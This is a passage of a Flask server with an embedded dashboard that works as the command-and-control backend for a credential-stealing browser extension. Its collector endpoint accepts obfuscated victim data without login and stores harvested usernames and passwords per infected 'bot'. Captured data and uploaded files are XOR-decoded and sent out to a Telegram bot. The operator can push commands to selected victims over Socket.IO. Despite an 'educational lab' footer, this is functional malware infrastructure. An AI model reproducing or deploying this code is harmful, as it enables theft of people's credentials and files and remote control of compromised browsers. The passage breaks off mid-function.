        </main>



        <!-- SYSTEM FOOTER -->

        <footer class="mt-10 border-t border-neutral-900 pt-6 text-center text-[10px] text-neutral-500 tracking-widest font-bold flex flex-col md:flex-row items-center justify-between gap-4">

            <p>EDUCATIONAL LAB SECURITY UTILITY • OPERATING IN LOCAL SANDBOX DEMO</p>

            <p class="text-neutral-600 hover:text-flipper-orange transition-colors">by XsanLahci - 2026</p>

        </footer>

    </div>



    <!-- CUSTOM SYSTEM NOTIFICATION MODALS -->

    <div id="modal-backdrop" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden z-50 flex items-center justify-center p-4">

        <div class="bg-neutral-950 border border-neutral-800 rounded-3xl p-6 max-w-sm w-full shadow-2xl relative overflow-hidden text-center">

            <div class="absolute inset-0 bg-gradient-to-b from-flipper-orange/5 to-transparent pointer-events-none"></div>

            <div id="modal-icon-container" class="w-14 h-14 bg-neutral-900 rounded-full flex items-center justify-center mx-auto mb-4 border border-neutral-800 text-flipper-orange text-xl">

                <i class="fa-solid fa-circle-info"></i>

            </div>

            <h3 id="modal-title" class="text-lg font-bold text-white tracking-wider mb-2">SYSTEM NOTIFICATION</h3>

            <p id="modal-body" class="text-xs text-neutral-400 mb-6 leading-relaxed">System settings updated.</p>

            <button onclick="closeModal()" class="w-full bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 hover:border-flipper-orange text-flipper-orange font-extrabold py-2.5 rounded-xl text-xs uppercase tracking-wider transition-all btn-active">

                Acknowledge

            </button>

        </div>

    </div>



    <!-- Socket.IO Client -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>

    

    <!-- WEB-AUDIO SYNTH SOUND EFFECTS -->

    <script>

        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

        function playBeep(freq = 800, duration = 80, type = 'sine') {

            try {

                if (audioCtx.state === 'suspended') { audioCtx.resume(); }

                const osc = audioCtx.createOscillator();

                const gain = audioCtx.createGain();

                osc.type = type;

                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);

                gain.gain.setValueAtTime(0.04, audioCtx.currentTime);

                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration/1000);

                osc.connect(gain); gain.connect(audioCtx.destination);

                osc.start(); osc.stop(audioCtx.currentTime + duration/1000);

            } catch(e) {}

        }

    </script>



    <!-- CLIENT LOGIC & REAL-TIME C2 MANAGER -->

    <script>

        let selectedFiles = [];

        let BOT_TOKEN = "{{DEFAULT_BOT_TOKEN}}";

        let CHAT_ID = "{{DEFAULT_CHAT_ID}}";

        const XOR_KEY = "{{DEFAULT_XOR_KEY}}";

        let map;

        let botMarkers = {};

        let selectedBotUUID = null;

        let credentialVault = {};

        let currentTab = 'vault';



        // --- TAB & TERMINAL ---

        function switchTab(tabName) {
            playBeep(700, 50);
            currentTab = tabName;
            if (tabName === 'vault') {
                document.getElementById('tab-content-vault').classList.remove('hidden');
                document.getElementById('tab-btn-vault').classList.add('border-flipper-orange', 'text-white');
                document.getElementById('tab-btn-vault').classList.remove('border-transparent', 'text-neutral-400');
            }
        }



        function renderTerminalOutput(uuid, output, isCommand) {

            const term = document.getElementById('terminal-output');

            const line = document.createElement('div');

            if (isCommand) {

                line.innerHTML = `<span class="text-flipper-orange">&gt;</span> <span class="text-neutral-300">${output}</span>`;

            } else {

                 line.innerHTML = `<span class="text-cyan-400">&lt;</span> <span class="text-neutral-400">${output}</span>`;

            }

            term.appendChild(line);

            term.scrollTop = term.scrollHeight;

        }



        // --- REAL-TIME C2 SOCKET.IO LOGIC ---

        const socket = io();



        socket.on('connect', () => {

            document.getElementById('socket-status-indicator').classList.remove('bg-yellow-500', 'bg-red-500');

            document.getElementById('socket-status-indicator').classList.add('bg-green-500');

            document.getElementById('socket-status-text').textContent = 'C2 SOCKET CONNECTED';

            playBeep(1200, 100);

            socket.emit('dashboard_connect'); // Announce to server that a dashboard has connected

        });



        socket.on('disconnect', () => {

            document.getElementById('socket-status-indicator').classList.remove('bg-green-500');

            document.getElementById('socket-status-indicator').classList.add('bg-red-500');

            document.getElementById('socket-status-text').textContent = 'C2 SOCKET DISCONNECTED';

            playBeep(200, 300);

        });



        socket.on('sessions_update', (sessions) => {

            renderSessionList(sessions);

            updateMapMarkers(sessions);

        });



        socket.on('vault_update', (vault) => {

            credentialVault = vault;

            renderVault();

        });

        

        socket.on('bot_status_update', (isActive) => {

            updateBotStatusUI(isActive);

        });



        function sendCommandToBot(command, params = {}) {

            if (!selectedBotUUID) {

                showModal("NO TARGET", "Please select a bot from the 'Active Bots' list first.", "fa-crosshairs text-yellow-400");

                return;

            }

            playBeep(600, 100);

            const payload = {

                uuid: selectedBotUUID,

                command: { name: command, ...params }

            };

            socket.emit('send_command', payload);

            showModal("COMMAND DISPATCHED", `Command '${command}' sent to bot ${selectedBotUUID.substring(0,8)}...`, "fa-paper-plane text-flipper-orange");

        }

        

        function toggleBotStatus() {

            playBeep(600, 100);

            socket.emit('toggle_bot_status');

        }



        function updateBotStatusUI(isActive) {

            const textSpan = document.getElementById('bot-status-btn-text');

            const icon = document.getElementById('bot-status-btn-icon');

            if (isActive) {

                textSpan.textContent = "BOT MONITORING: ACTIVE (CLICK TO STOP)";

                icon.className = "fa-solid fa-play text-emerald-500";

            } else {

                textSpan.textContent = "BOT MONITORING: DISABLED (CLICK TO START)";

                icon.className = "fa-solid fa-stop text-red-500";

            }

        }

        

        function getOSIcon(platform) {

            platform = (platform || '').toLowerCase();

            if (platform.includes('win')) return 'fa-brands fa-windows';

            if (platform.includes('mac')) return 'fa-brands fa-apple';

            if (platform.includes('linux')) return 'fa-brands fa-linux';

            if (platform.includes('android')) return 'fa-brands fa-android';

            return 'fa-solid fa-question-circle';

        }



        function selectBot(uuid) {

            playBeep(900, 50);

            if (selectedBotUUID === uuid) { // If clicking the same bot, deselect it

                selectedBotUUID = null;

                document.getElementById('selected-bot-uuid').textContent = 'NO TARGET SELECTED';

                // document.getElementById('terminal-target-uuid').textContent = 'NONE';

            } else {

                selectedBotUUID = uuid;

                document.getElementById('selected-bot-uuid').textContent = `TARGET: ${uuid.substring(0,8)}...`;

                // document.getElementById('terminal-target-uuid').textContent = `${uuid.substring(0,8)}...`;

            }

            // Need to manually re-render to update the highlight since we don't have get_active_bots on client

            // Easiest is to just toggle classes directly here

            document.querySelectorAll('.bot-entry').forEach(el => {

                if (el.dataset.uuid === selectedBotUUID) {

                    el.classList.add('border-flipper-orange');

                    el.classList.remove('border-neutral-800');

                } else {

                    el.classList.remove('border-flipper-orange');

                    el.classList.add('border-neutral-800');

                }

            });

            renderVault(); // Re-render vault for the selected bot

        }

        

        function renderSessionList(sessions) {

            const sessionList = document.getElementById('session-list');

            const botCount = document.getElementById('bot-count');

            const sessionKeys = Object.keys(sessions);



            if(!sessionList || !botCount) return;

            botCount.textContent = sessionKeys.length;

            

            if (sessionKeys.length === 0) {

                sessionList.innerHTML = `<div class="text-center text-xs text-neutral-500 py-4">No active bots detected.</div>`;

                return;

            }



            let html = '';

            for (const uuid in sessions) {

                const data = sessions[uuid];

                const osIcon = getOSIcon(data.os);

                const now = new Date().getTime() / 1000;

                const lastSeen = Math.round(now - data.last_seen);

                const isSelected = uuid === selectedBotUUID;



                html += `

                <div class="bot-entry flex items-center justify-between bg-neutral-950/70 p-3 border ${isSelected ? 'border-flipper-orange' : 'border-neutral-800'} rounded-lg hover:border-flipper-orange/50 transition-colors cursor-pointer" onclick="selectBot('${uuid}')" data-uuid="${uuid}">

                    <div class="flex items-center gap-3">

                        <i class="${osIcon} text-lg text-neutral-400 w-6 text-center"></i>

                        <div>

                            <div class="text-sm font-bold text-emerald-400">${data.ip}</div>

                            <div class="text-[10px] text-neutral-500 font-mono">${data.os}</div>

                        </div>

                    </div>

                    <div class="text-xs text-neutral-500 font-mono text-right">

                        ${lastSeen}s ago

                    </div>

                </div>`;

            }

            sessionList.innerHTML = html;

        }



        function renderVault() {

            const vaultContent = document.getElementById('vault-content');

            if (!selectedBotUUID || !credentialVault[selectedBotUUID]) {

                vaultContent.innerHTML = `<p class="text-center text-xs text-neutral-500 py-4">Select a bot to view its credentials, or no credentials collected for this bot yet.</p>`;

                return;

            }



            const entries = credentialVault[selectedBotUUID];

            let html = `

                <table class="w-full text-left text-xs">

                    <thead class="text-neutral-400 uppercase tracking-wider border-b border-neutral-700">

                        <tr>

                            <th class="p-2">URL</th>

                            <th class="p-2">Username</th>

                            <th class="p-2">Password</th>

                            <th class="p-2">Timestamp</th>

                        </tr>

                    </thead>

                    <tbody>

            `;

            entries.forEach(entry => {

                const creds = entry.creds || {};

                html += `

                    <tr class="border-b border-neutral-800 font-mono">

                        <td class="p-2 text-flipper-orange truncate" title="${entry.url}">${entry.url}</td>

                        <td class="p-2">${creds.username || 'N/A'}</td>

                        <td class="p-2">${creds.password || 'N/A'}</td>

                        <td class="p-2 text-neutral-500">${entry.timestamp}</td>

                    </tr>

                `;

            });

            html += `</tbody></table>`;

            vaultContent.innerHTML = html;

        }



        

        // --- EXISTING UI/FILE LOGIC (NO MAJOR CHANGES) ---

        const dropzone = document.getElementById('dropzone');

        const fileInput = document.getElementById('fileInput');

        dropzone.addEventListener('dragover', e => { e.preventDefault(); dropzone.classList.add('border-flipper-orange', 'bg-flipper-orange/5'); });

        dropzone.addEventListener('dragleave', () => { dropzone.classList.remove('border-flipper-orange', 'bg-flipper-orange/5'); });

        dropzone.addEventListener('drop', e => { e.preventDefault(); dropzone.classList.remove('border-flipper-orange', 'bg-flipper-orange/5'); playBeep(900, 100); handleFiles(e.dataTransfer.files); });

        fileInput.addEventListener('change', e => { playBeep(900, 100); handleFiles(e.target.files); });

        

        function showModal(title, body, iconClass = "fa-circle-info") {

            document.getElementById('modal-title').textContent = title;

            document.getElementById('modal-body').textContent = body;

            document.getElementById('modal-icon-container').innerHTML = `<i class="fa-solid ${iconClass}"></i>`;

            document.getElementById('modal-backdrop').classList.remove('hidden');

        }



        function closeModal() {

            playBeep(700, 60);

            document.getElementById('modal-backdrop').classList.add('hidden');

        }



        function xorUint8Array(array, key) {

            const keyBytes = new TextEncoder().encode(key);

            const result = new Uint8Array(array.length);

            for (let i = 0; i < array.length; i++) {

                result[i] = array[i] ^ keyBytes[i % keyBytes.length];

            }

            return result;

        }



        function uint8ToBase64(uint8Array) {

            let binary = '';

            const len = uint8Array.byteLength;

            for (let i = 0; i < len; i++) {

                binary += String.fromCharCode(uint8Array[i]);

            }

            return btoa(binary);

        }



        function obfuscateString(str, key) {

            let encoder = new TextEncoder();

            let bytes = encoder.encode(str);

            let xored = xorUint8Array(bytes, key);

            return uint8ToBase64(xored);

        }



        function readFileAsArrayBuffer(file) {

            return new Promise((resolve, reject) => {

                const reader = new FileReader();

                reader.onload = () => resolve(reader.result);

                reader.onerror = () => reject(reader.error);

                reader.readAsArrayBuffer(file);

            });

        }

        

        function handleFiles(files) {

            const allowed = ['pdf','docx','xls','xlsx','txt','csv','xml','html','php','db','sql','zip','rar','gz','pcap','jpg','jpeg','png','json','doc','sqlite','log'];

            const newFiles = Array.from(files).filter(f => allowed.includes(f.name.split('.').pop().toLowerCase()));

            if (newFiles.length < files.length) {

                showModal("FILTER INTRUSION", "Several files were bypassed due to unsupported format profiles.", "fa-filter text-amber-500");

            }

            newFiles.forEach(nf => {

                if(!selectedFiles.some(f => f.name === nf.name && f.size === nf.size)){ selectedFiles.push(nf); }

            });

            renderFileList(); updateVirtualScreen();

        }



        function removeFile(index) {

            playBeep(400, 80); selectedFiles.splice(index, 1); renderFileList(); updateVirtualScreen();

        }



        function renderFileList() {

            const listContainer = document.getElementById('fileList');

            const uploadBtn = document.getElementById('uploadBtn');

            if (selectedFiles.length === 0) { listContainer.innerHTML = ''; uploadBtn.disabled = true; return; }

            uploadBtn.disabled = false;

            let html = `<div class="flex items-center justify-between border-b border-neutral-800 pb-2.5 mb-3"><span class="text-xs font-bold text-flipper-orange tracking-wider">QUEUED TARGET PAYLOADS (${selectedFiles.length})</span><span class="text-[10px] text-neutral-500 font-mono">${(selectedFiles.reduce((acc, f) => acc + f.size, 0) / (1024*1024)).toFixed(3)} MB TOTAL</span></div>`;

            selectedFiles.forEach((file, i) => {

                const ext = file.name.split('.').pop().toUpperCase();

                let fileIcon = 'fa-file-lines';

                if(['ZIP','RAR','GZ'].includes(ext)) fileIcon = 'fa-file-zipper';

                if(['DB','SQL'].includes(ext)) fileIcon = 'fa-database';

                html += `<div class="flex items-center justify-between bg-neutral-950/70 hover:bg-neutral-950 p-3.5 border border-neutral-800 rounded-xl transition-all duration-200 group"><div class="flex items-center gap-3 w-4/5"><div class="w-8 h-8 rounded-lg bg-neutral-900 border border-neutral-800 flex items-center justify-center text-flipper-orange text-sm group-hover:bg-neutral-850"><i class="fa-solid ${fileIcon}"></i></div><div class="truncate"><div class="text-xs font-bold text-neutral-200 truncate">${file.name}</div><div class="text-[10px] text-neutral-500 font-mono mt-0.5">${(file.size/1024).toFixed(1)} KB • EXTENSION: ${ext}</div></div></div><button onclick="removeFile(${i})" class="text-neutral-500 hover:text-red-500 p-1 rounded-lg transition-colors"><i class="fa-solid fa-trash-can text-sm"></i></button></div>`;

            });

            listContainer.innerHTML = html;

        }



        async function sendToTelegramSecure(file) {

            try {

                const arrayBuffer = await readFileAsArrayBuffer(file);

                const uint8Array = new Uint8Array(arrayBuffer);

                const obfuscatedBytes = xorUint8Array(uint8Array, XOR_KEY);

                const fileDataB64 = uint8ToBase64(obfuscatedBytes);

                

                const payload = {

                    fileName: obfuscateString(file.name, XOR_KEY),

                    fileData: fileDataB64,

                    customToken: obfuscateString(BOT_TOKEN, XOR_KEY),

                    customChatId: obfuscateString(CHAT_ID, XOR_KEY)

                };



                const res = await fetch('/api/v1/dispatch', {

                    method: 'POST',

                    headers: { 'Content-Type': 'application/json' },

                    body: JSON.stringify(payload)

                });

                const result = await res.json();

                return { ok: result.ok, status: result.status, description: result.description || "Unknown Error" };

            } catch (e) { 

                return { ok: false, status: "NET_ERROR", description: e.message || "Connection to secure reverse proxy failed" }; 

            }

        }

        

        async function uploadFiles() {

            if (selectedFiles.length === 0) return;



            // Direct Form Auto-Synchronization

            const tokenField = document.getElementById('tg_token_field');
            if (tokenField) BOT_TOKEN = tokenField.value.trim();

            const chatField = document.getElementById('tg_chat_field');
            if (chatField) CHAT_ID = chatField.value.trim();



            const btn = document.getElementById('uploadBtn');

            const prog = document.getElementById('progressContainer');

            const bar = document.getElementById('progressBar');

            const txt = document.getElementById('progressText');

            const log = document.getElementById('log');



            btn.disabled = true;

            prog.classList.remove('hidden');

            log.innerHTML = '';



            // Update LCD Screen Mascot Animation State

            document.getElementById('dolphin-idle').classList.add('hidden');

            document.getElementById('dolphin-success').classList.add('hidden');

            document.getElementById('dolphin-hacking').classList.remove('hidden');

            setLedState('red');



            function logMsg(msg, isSuccess = true) {

                const t = new Date().toLocaleTimeString();

                const textClass = isSuccess ? 'text-emerald-400' : 'text-red-400';

                const prefix = isSuccess ? '✓' : '✗';

                log.innerHTML += `<div class="${textClass} font-mono tracking-wide leading-relaxed">[${t}] ${prefix} ${msg}</div>`;

                log.scrollTop = log.scrollHeight;

            }



            logMsg("=== INITIATING CYBER EXFILTRATION TRANSPORT ===");

            logMsg("Routing proxy connection locally -> http://127.0.0.1:1337/api/v1/dispatch");

            logMsg("Applying client-side XOR obfuscation algorithm on binary streams...");



            let totalFiles = selectedFiles.length;

            let successCount = 0;

            let failureCount = 0;

            let lastErrorCode = null;

            let lastErrorDesc = "";



            for (let i = 0; i < totalFiles; i++) {

                const file = selectedFiles[i];

                

                document.getElementById('screen-title').textContent = "DISPATCHING...";

                document.getElementById('screen-sub').textContent = file.name;

                document.getElementById('screen-status').textContent = "BUSY";

                playBeep(700, 150, 'sawtooth');



                logMsg(`Tunneling secure payload -> ${file.name} (${(file.size/1024).toFixed(1)} KB)`);

                

                const response = await sendToTelegramSecure(file);

                

                const perc = Math.round(((i + 1) / totalFiles) * 100);

                bar.style.width = perc + '%';

                txt.textContent = perc + '%';



                if (response.ok) {

                    successCount++;

                    logMsg(`✓ ${file.name} forwarded & decrypted successfully`, true);

                    playBeep(1100, 80);

                } else {

                    failureCount++;

                    lastErrorCode = response.status;

                    lastErrorDesc = response.description;

                    logMsg(`✗ Proxy failure: ${file.name} [Status ${response.status}: ${response.description}]`, false);

                    playBeep(250, 300, 'square');

                }

                

                // Sleep delay interval to prevent Telegram API rate limits

                await new Promise(r => setTimeout(r, 800));

            }



            logMsg("=== DISPATCH COMPLETED IN ENCRYPTED PIPELINE ===", failureCount === 0);

            playBeep(1500, 400);



            // Response Validation logic checking Telegram endpoint connectivity status dynamically

            if (failureCount === totalFiles) {

                // All exfil dispatches failed

                document.getElementById('screen-title').textContent = "DISPATCH FAIL";

                document.getElementById('screen-sub').textContent = `C2 Error ${lastErrorCode}`;

                document.getElementById('screen-status').textContent = "ERROR";

                

                document.getElementById('dolphin-hacking').classList.add('hidden');

                document.getElementById('dolphin-success').classList.add('hidden');

                document.getElementById('dolphin-idle').classList.remove('hidden');

                setLedState('red');



                setTimeout(() => {

                    let title = `TRANSMISSION FAILED (${lastErrorCode})`;

                    let body = `Transmission payload rejected by Telegram C2.\n\nReason: "${lastErrorDesc}"\n\nPlease check your Bot Token & Chat ID keys.`;

                    

                    if (lastErrorCode === 401) {

                        title = "UNAUTHORIZED (401)";

                        body = `The Telegram Bot Token is unauthorized, expired, or revoked by @BotFather.\n\nTelegram response: "${lastErrorDesc}"`;

                    } else if (lastErrorCode === 400) {

                        title = "BAD REQUEST (400)";

                        body = `The chat parameters are malformed or the Bot is not added to the target chat.\n\nTelegram response: "${lastErrorDesc}"`;

                    } else if (lastErrorCode === "NET_ERROR") {

                        title = "NETWORK ERROR";

                        body = `Could not connect to the Telegram API servers.\n\nDetails: "${lastErrorDesc}"`;

                    }

                    

                    showModal(title, body, "fa-solid fa-circle-xmark text-red-500");

                    btn.disabled = false;

                }, 1000);



            } else if (failureCount > 0) {

                // Part success, part failure

                document.getElementById('screen-title').textContent = "PARTIAL DISPATCH";

                document.getElementById('screen-sub').textContent = `${successCount} done, ${failureCount} failed`;

                document.getElementById('screen-status').textContent = "WARN";



                document.getElementById('dolphin-hacking').classList.add('hidden');

                document.getElementById('dolphin-idle').classList.remove('hidden');

                setLedState('orange');



                setTimeout(() => {

                    showModal("PARTIAL TRANSMISSION", `Successfully tunneled ${successCount} files, but ${failureCount} dispatches failed during network transport.`, "fa-solid fa-triangle-exclamation text-amber-500");

                    selectedFiles = [];

                    document.getElementById('fileList').innerHTML = '';

                    btn.disabled = true;

                    prog.classList.add('hidden');

                    bar.style.width = '0%';

                    updateVirtualScreen();

                }, 1000);



            } else {

                // Flawless pipeline success

                document.getElementById('screen-title').textContent = "EXFIL DONE";

                document.getElementById('screen-sub').textContent = `${totalFiles} files routed!`;

                document.getElementById('screen-status').textContent = "DONE";

                

                document.getElementById('dolphin-hacking').classList.add('hidden');

                document.getElementById('dolphin-success').classList.remove('hidden');

                setLedState('green');



                setTimeout(() => {

                    showModal("EXFILTRATION COMPLETE", `Dispatched ${totalFiles} file(s) safely through proxy to Telegram C2 Server connection point.`, "fa-solid fa-circle-check text-emerald-500");

                    selectedFiles = [];

                    document.getElementById('fileList').innerHTML = '';

                    btn.disabled = true;

                    prog.classList.add('hidden');

                    bar.style.width = '0%';

                    setLedState('orange');

                    updateVirtualScreen();

                }, 1200);

            }

        }

        function setLedState(state) {

            const led = document.getElementById('hardware-led');

            led.className = "w-3.5 h-3.5 rounded-full transition-colors duration-300";

            if (state === 'green') {

                led.classList.add('bg-emerald-500', 'shadow-[0_0_8px_rgba(16,185,129,0.9)]');

            } else if (state === 'red') {

                led.classList.add('bg-red-500', 'shadow-[0_0_8px_rgba(239,68,68,0.9)]');

            } else {

                led.classList.add('bg-orange-500', 'shadow-[0_0_8px_rgba(249,115,22,0.9)]');

            }

        }

        function navScreen(direction) {

            playBeep(800, 40);

            

            if (direction === 'UP' || direction === 'LEFT') {

                currentScreenMode = (currentScreenMode - 1 + 4) % 4;

            } else if (direction === 'DOWN' || direction === 'RIGHT') {

                currentScreenMode = (currentScreenMode + 1) % 4;

            } else if (direction === 'OK') {

                playBeep(1200, 100);

                if (currentScreenMode === 2) {

                    toggleAccordion('config-drawer');

                }

            } else if (direction === 'BACK') {

                currentScreenMode = 0;

            }



            updateVirtualScreen();

        }

        function updateVirtualScreen() {

            const title = document.getElementById('screen-title');

            const sub = document.getElementById('screen-sub');

            const count = document.getElementById('screen-count');

            const modeDesc = document.getElementById('screen-mode-desc');



            count.textContent = selectedFiles.length;

            modeDesc.textContent = screenModeDescriptors[currentScreenMode];



            document.getElementById('dolphin-idle').classList.remove('hidden');

            document.getElementById('dolphin-hacking').classList.add('hidden');

            document.getElementById('dolphin-success').classList.add('hidden');



            if (currentScreenMode === 0) {

                title.textContent = selectedFiles.length > 0 ? "DISPATCH READY" : "SYSTEM READY";

                sub.textContent = selectedFiles.length > 0 ? `${selectedFiles.length} file(s) queued` : "Drop files into exfil gateway";

            } else if (currentScreenMode === 1) {

                title.textContent = "PAYLOAD QUEUE";

                sub.textContent = selectedFiles.length > 0 ? `Total size: ${(selectedFiles.reduce((a,f)=>a+f.size,0)/1024).toFixed(1)} KB` : "Queue is empty";

            } else if (currentScreenMode === 2) {

                title.textContent = "C2 CONFIG";

                const tempToken = BOT_TOKEN !== "xxx:xxx" ? (BOT_TOKEN.substring(0, 10) + "...") : "xxx:xxx";

                sub.textContent = `Tok:${tempToken} ID:${CHAT_ID}`;

            } else if (currentScreenMode === 3) {

                title.textContent = "RED TEAM SUITE";

                sub.textContent = "Created by xsanlahci";

            }

        }



        // Real-time LCD Seconds Timer sync

        setInterval(() => {

            const timeSpan = document.getElementById('screen-timer');

            if(timeSpan) timeSpan.textContent = new Date().toTimeString().split(' ')[0];

        }, 1000);



        // Initial Hardware Load Sequence

        window.onload = function() {

            setLedState('orange');

            updateVirtualScreen();

            // initializeMap();

            // Initial status is fetched via websocket 'connect' and 'bot_status_update' events now

        };

    </script>

</body>

</html>"""



# ================== ALAT BANTU (XOR Dekripsi & Obfuscation) ==================

def xor_decrypt(data_base64, key):

    """

    Melakukan dekode Base64 lalu menerapkan XOR bitwise dinamis.

    Berguna untuk mendekripsi isi berkas biner mentah secara langsung di RAM.

    """

    if not data_base64:

        return b""

    encrypted_data = base64.b64decode(data_base64)

    key_bytes = key.encode('utf-8')

    decrypted = bytearray(len(encrypted_data))

    for i in range(len(encrypted_data)):

        decrypted[i] = encrypted_data[i] ^ key_bytes[i % len(key_bytes)]

    return bytes(decrypted)



def decrypt_string(obfuscated_b64, key):

    """

    Mendekripsi parameter data string teks biasa (seperti nama berkas dan konfigurasi).

    """

    if not obfuscated_b64:

        return ""

    try:

        decrypted_bytes = xor_decrypt(obfuscated_b64, key)

        return decrypted_bytes.decode('utf-8')

    except Exception:

        return ""



def generate_captcha_svg():

    """

    Membuat verifikasi Captcha dinamis 5 digit acak (A-Z) dalam bentuk gambar SVG langsung.

    Disimpan di memori sesi Flask untuk mencegah intrusi bot peretas otomatis.

    """

    chars = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=5))

    session['captcha'] = chars

    

    # Merender tag visual latar belakang SVG gelap

    svg = f"""<svg xmlns="http://www.w3.org/2000/svg" width="150" height="50" viewBox="0 0 150 50">

        <rect width="100%" height="100%" fill="#0a0a0c" rx="8" stroke="#27272a" stroke-width="1"/>

    """

    

    # Membuat efek garis pengganggu (distortion lines) agar lolos dari scan OCR sederhana

    for _ in range(5):

        x1 = random.randint(0, 50)

        y1 = random.randint(5, 45)

        x2 = random.randint(100, 150)

        y2 = random.randint(5, 45)

        svg += f'<line x1="{x1}" y1="{y1}" x2="{x2}" y2="{y2}" stroke="#FF8C00" stroke-width="1.5" opacity="0.3"/>'

        

    # Merender teks karakter dengan distorsi rotasi & posisi koordinat acak

    font_sizes = [24, 25, 26, 27, 28]

    for i, char in enumerate(chars):

        angle = random.randint(-16, 16)

        x = 18 + (i * 24) + random.randint(-3, 3)

        y = 34 + random.randint(-4, 4)

        svg += f'<text x="{x}" y="{y}" fill="#FF8C00" font-family="JetBrains Mono, monospace" font-weight="900" font-size="{random.choice(font_sizes)}" transform="rotate({angle} {x} {y})" opacity="0.95">{char}</text>'

        

    svg += "</svg>"

    return svg



@app.route('/')

def index():

    # Jika sesi pengguna belum terverifikasi login, tampilkan layar masuk taktis

    if not session.get('logged_in'):

        return LOGIN_HTML_CONTENT

        

    # Menyuntikkan konfigurasi secara dinamis ke sisi memori klien saat berhasil masuk

    return (HTML_CONTENT.replace("{{DEFAULT_BOT_TOKEN}}", BOT_TOKEN)
                        .replace("{{DEFAULT_CHAT_ID}}", CHAT_ID)
                        .replace("{{DEFAULT_XOR_KEY}}", XOR_KEY))



# ================== RUTE KEAMANAN: GENERATOR CAPTCHA & LOGIN/LOGOUT ==================

@app.route('/api/v1/captcha')

def get_captcha():

    svg_data = generate_captcha_svg()

    return send_file(io.BytesIO(svg_data.encode('utf-8')), mimetype='image/svg+xml')



@app.route('/api/v1/login', methods=['POST'])

def login():

    try:

        data = request.json or {}

        username = data.get('username', '').strip()

        password = data.get('password', '')

        captcha = data.get('captcha', '').strip().upper()

        

        server_captcha = session.get('captcha')

        if not server_captcha or captcha != server_captcha:

            return jsonify({"ok": False, "description": "Kode captcha tidak valid."}), 400

        if username != "flipper":

            return jsonify({"ok": False, "description": "Nama pengguna administratif salah."}), 401

            

        is_valid = bcrypt.checkpw(password.encode('utf-8'), BCRYPT_PASSWORD_HASH.encode('utf-8'))

        if not is_valid:

            return jsonify({"ok": False, "description": "Kombinasi kata sandi tidak valid."}), 401

            

        session['logged_in'] = True

        session.permanent = True

        session.pop('captcha', None)

        return jsonify({"ok": True, "description": "Akses diberikan."}), 200

    except Exception as e:

        logging.error(f"Login error: {e}")

        return jsonify({"ok": False, "description": f"Galat autentikasi internal: {str(e)}"}), 500



@app.route('/logout')

def logout():

    session.clear()

    return redirect(url_for('index'))



# ================== RUTE PROXY: REVERSE PROXY DISPATCH (FILE EXFIL) ==================

@app.route('/api/v1/dispatch', methods=['POST'])

def dispatch():

    if not session.get('logged_in'):

        return jsonify({"ok": False, "status": 401, "description": "Akses ditolak"}), 401

    try:

        data = request.json

        if not data: return jsonify({"ok": False, "status": 400, "description": "Muatan kosong"}), 400

        

        token = decrypt_string(data.get("customToken"), XOR_KEY) or BOT_TOKEN

        chat_id = decrypt_string(data.get("customChatId"), XOR_KEY) or CHAT_ID

        file_name = decrypt_string(data.get("fileName"), XOR_KEY)

        file_bytes = xor_decrypt(data.get("fileData"), XOR_KEY)

        

        file_stream = io.BytesIO(file_bytes); file_stream.name = file_name

        url = f"https://api.telegram.org/bot{token}/sendDocument"

        file_size_mb = len(file_bytes) / (1024 * 1024)

        

        caption = f"🐬 *FLIPPER ZERO • BLACKHAT EXFIL* 🐬\\n\\n📁 *File:* {file_name}\\n📦 *Size:* {file_size_mb:.3f} MB\\n⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\n🔒 *Status:* Decrypted & Tunneling Completed Successfully"

        response = requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"document": (file_name, file_stream)}, timeout=30)

        res_json = response.json()

        

        return jsonify({"ok": res_json.get("ok", False), "status": response.status_code, "description": res_json.get("description", "Pengiriman berhasil diteruskan")}), response.status_code

    except requests.exceptions.RequestException as re:

        return jsonify({"ok": False, "status": "NET_ERROR", "description": f"Galat Jaringan API Telegram C2: {str(re)}"}), 502

    except Exception as e:

        logging.error(f"Dispatch error: {e}")

        return jsonify({"ok": False, "status": 500, "description": f"Galat internal reverse proxy: {str(e)}"}), 500



# ================== ENDPOINT KOLEKTOR DATA BOT ==================

@app.route('/api/v1/collector', methods=['POST'])

def collector():

    """Menerima data JSON terenkripsi dari browser extension (tanpa perlu sesi login)."""

    try:

        req_data = request.json

        if not req_data or 'data' not in req_data:

            return jsonify({"ok": False, "status": 400, "description": "Invalid JSON or 'data' key missing"}), 400



        decrypted_json_string = decrypt_string(req_data.get("data"), XOR_KEY)

        if not decrypted_json_string:

            return jsonify({"ok": False, "status": 400, "description": "Gagal dekripsi data"}), 400



        data_object = json.loads(decrypted_json_string)

        uuid = data_object.get("uuid")

        if not uuid:

            return jsonify({"ok": False, "status": 400, "description": "Payload tidak memiliki UUID."}), 400



        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        

        # Update/Create session data

        if uuid not in ACTIVE_SESSIONS:

             ACTIVE_SESSIONS[uuid] = {}

             logging.info(f"New bot connected: {uuid} from IP: {client_ip}")

        

        ACTIVE_SESSIONS[uuid].update({

            "ip": client_ip,

            "os": data_object.get("platform", "Unknown OS"),

            "last_seen": datetime.now().timestamp(),

            "url": data_object.get("url", "N/A"),

        })



        # Kirim data ke Telegram

        send_to_telegram(client_ip, data_object)



        



        # Cek jika ini adalah data kredensial dan simpan ke Vault

        if data_object.get("type") in ["LOGIN_DATA", "FORM_SUBMIT"]:

            if uuid not in CREDENTIAL_VAULT:

                CREDENTIAL_VAULT[uuid] = []

            

            vault_entry = {

                "url": data_object.get("url"),

                "creds": data_object.get("creds"),

                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            }

            CREDENTIAL_VAULT[uuid].append(vault_entry)

            socketio.emit('vault_update', CREDENTIAL_VAULT, room='dashboard')

            # Save to SQLite DB
            try:
                import sqlite3
                if "db_file" not in ACTIVE_SESSIONS[uuid]:
                    host_str = client_ip.replace('.', '_').replace(':', '_')
                    ACTIVE_SESSIONS[uuid]["db_file"] = f"{host_str}_{int(datetime.now().timestamp())}.db"
                
